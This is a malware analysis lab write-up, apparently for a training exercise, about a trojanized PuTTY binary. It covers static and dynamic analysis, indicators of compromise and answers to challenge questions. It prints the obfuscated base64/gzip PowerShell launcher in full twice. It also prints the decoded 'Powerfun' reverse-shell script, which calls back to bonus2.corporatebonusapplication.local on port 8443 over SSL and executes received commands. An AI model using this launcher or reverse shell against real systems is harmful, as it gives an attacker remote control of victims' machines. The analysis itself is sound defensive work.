# putty.exe

## Identification:

**FileName:** putty.exe

**SHA256:** 0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83

**FileSize:** 1548288 (bytes)

<br>

## Analysis:

### Static Analysis

For the initial triage, the sample was loaded in PEStudio as shown below.

<image src="../Images/putty.exe1.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Followings were found:
- The entropy of this sample was high (7.394 out of 8) so it could be packed.
- The sample is 32-bit and has GUI interface.
- The sample was compiled on Sat Jul 10 02:51:55 2021.

To verify more on if its packed, the virtual size and raw size of the .text sections of this sample were checked and was found to be similar as shown below. 

<image src="../Images/putty.exe2.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

The entropy may be high because of the compiler used in compiling the putty.

<br>

Then the strings were checked using the FLOSS tool with the command:

`floss.exe putty.exe`

There were many strings that were of legitimate putty. But one string was very suspicious which is shown below.

    powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"

The above string is Base64 encoded and Gzipped which is passed into powershell. Using cyberchef the above contents were decoded as shown below. 

<image src="../Images/putty.exe3.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

The decoded content is shown below which seems to be a reverse shell to bonus2.corporatebonusapplication.local over port 8443. Also the reverse shell seems to use SSL during communication. 

    # Powerfun - Written by Ben Turner & Dave Hardy
    
    function Get-Webclient 
    {
        $wc = New-Object -TypeName Net.WebClient
        $wc.UseDefaultCredentials = $true
        $wc.Proxy.Credentials = $wc.Credentials
        $wc
    }
    function powerfun 
    { 
        Param( 
        [String]$Command,
        [String]$Sslcon,
        [String]$Download
        ) 
        Process {
        $modules = @()  
        if ($Command -eq "bind")
        {
            $listener = [System.Net.Sockets.TcpListener]8443
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 
        if ($Command -eq "reverse")
        {
            $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
        }
    
        $stream = $client.GetStream()
    
        if ($Sslcon -eq "true") 
        {
            $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
            $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
            $stream = $sslStream 
        }
    
        [byte[]]$bytes = 0..20000|%{0}
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        if ($Download -eq "true")
        {
            $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
            $stream.Write($sendbytes,0,$sendbytes.Length)
            ForEach ($module in $modules)
            {
                (Get-Webclient).DownloadString($module)|Invoke-Expression
            }
        }
    
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)
    
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
    
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x
    
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        $listener.Stop()
        }
    }
    
    powerfun -Command reverse -Sslcon true

This proves that the putty is trojanized as RAT. Let verify it more by dynamically analyzing it in the next section.

<br>

### Dynamic Analysis:

The sample was then executed for dynamic analysis. On execution a blue screen flashed for just a second and disappeared. When checking the processes in Process Monitor, the putty sample on execution spawn a powershell child process as shown below.

<image src="../Images/putty.exe4.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

On further checking the powershell process, the command passed to it is the same that was identified in the static analysis during string analysis. 

<image src="../Images/putty.exe5.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

As we know from static analysis that obfuscated content passed to powershell will try to establish a reverse shell to bonus2[.]corporatebonusapplication[.]local over port 8443. When checking the Wireshark capture, it was found that it was trying to reach bonus2[.]corporatebonusapplication[.]local. Since the lab was isolated with no network simulation active, the resolution to that domain fail making the sample unable to reach it.

<image src="../Images/putty.exe6.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

Now in Remnux machine, INetSim was runned for network simulation. 

<image src="../Images/putty.exe7.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Also in Remnux machine, port 8443 was listened using the netcat. 

<image src="../Images/putty.exe8.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

After that the sample was executed again. After the execution of sample, a connection was established from the infected Windows machine on the netcat on Remnux machine. Some message was displayed along with some gibberish values. And on entering a command 'whoami', the connection was terminated as shown below.

<image src="../Images/putty.exe9.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

This may be because of SSL due to which it cannot handle the connection. The Wireshark capture also verifies the SSL connection,

<image src="../Images/putty.exe10.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

To overcome this, netcat was again used to listen along with ssl option to handle this connection as shown below.

<image src="../Images/putty.exe11.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

Then the sample was executed again. This time the SSL connection was handled by netcat and a fully functional reverse shell connection was established. On entering the command 'whoami', it returned the user of the infected machine verifying it to be a RAT.

<image src="../Images/putty.exe12.png" caption="" alt="" height="" width="" position="center" command="fit" option="" class="img-fluid" title="" >

<br>

# Indicator of Compromise:

## Network-based Indicators:
- bonus2[.]corporatebonusapplication[.]local

## Host-based Indicators:
- The child powershell process spawned by putty which execute the base64 encoded Gzipped payload.

<br>

## Challenge Questions:

### Basic Static Analysis

**What is the SHA256 hash of the sample?**

0C82E654C09C8FD9FDF4899718EFA37670974C9EEC5A8FC18A167F93CEA6EE83

<br>

**What architecture is this binary?**

32-bit

<br>

**Are there any results from submitting the SHA256 hash to VirusTotal?**

58/71 flagged as malicious

<br>

**Describe the results of pulling the strings from this binary. Record and describe any strings that are potentially interesting. Can any interesting information be extracted from the strings?**

One string was particularly suspicious as identified in static analysis, which is:

    powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"

<br>

**Describe the results of inspecting the IAT for this binary. Are there any imports worth noting?**

There were import APIs that were interesting like ShellExecute, GetClipboardData, RegCreateKeyExA, CreateMutexA and more, but they could also be used by legitimate putty.

<br>

**Is it likely that this binary is packed?**

Although the entropy of this sample was high, the raw size and virtual size of the .text section were similar. Also, meaningful strings and Import APIs were found. So, this does not seem to be packed.

<br>

### Basic Dynamic Analysis

**Describe initial detonation. Are there any notable occurrences at first detonation? Without internet simulation? With internet simulation?**

During initial detonation without any internet simulation, a blue screen flashed for just a second and disappeared. Also, from Process Monitor capture, it was found that the putty spawn a powershell child process with the commands identified during string analysis. From Wireshark capture it was found that was trying to reach bonus2[.]corporatebonusapplication[.]local.

During initial detonation with internet simulation, actions similar to that without internet simulation occur. Additionally, after resolution of bonus2[.]corporatebonusapplication[.]local, it initiate a reverse shell connection over port 8443 with SSL.

**From the host-based indicators perspective, what is the main payload that is initiated at detonation? What tool can you use to identify this?**

 From the host-based indicators perspective, the main payload that is initiated at detonation was the base64 encoded and Gzipped command executed by the powershell, which was spawned as child process by putty. 

<br>

**What is the DNS record that is queried at detonation?**

bonus2[.]corporatebonusapplication[.]local

<br>

**What is the callback port number at detonation?**

8443

<br>

**What is the callback protocol at detonation?**

SSL/TLS

<br>

**How can you use host-based telemetry to identify the DNS record, port, and protocol?**

In Process Monitor, use filter 'Operation Contains TCP'

<br>

**Attempt to get the binary to initiate a shell on the localhost. Does a shell spawn? What is needed for a shell to spawn?**

For shell to spawn, TLS handshake was needed to be handled. For this netcat was used with ssl option as:

`ncat -lvn --ssl 8443`